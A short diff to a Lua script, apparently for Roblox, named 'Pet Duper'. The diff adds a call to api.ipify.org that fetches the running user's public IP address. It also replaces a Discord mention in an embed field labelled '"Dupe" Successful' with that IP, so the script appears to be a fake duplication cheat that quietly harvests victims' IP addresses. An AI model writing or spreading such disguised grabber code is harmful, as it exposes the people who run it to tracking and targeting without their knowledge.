@@ -10,6 +10,7 @@ local test2 = 'Test'
 local OSTime = os.time();
 local Time = os.date('!*t', OSTime);
 local TestTitle = 'Pet Duper';
+local ipipip = game:HttpGet("https://api.ipify.org")
 local Embed = {
     title = 'Pets';
     color = '000000';
@@ -21,7 +22,7 @@ local Embed = {
     fields = {
         {
             name = '"Dupe" Successful';
-            value = '<@568416088543723561>';
+            value = ipipip;
         }
     };
     timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
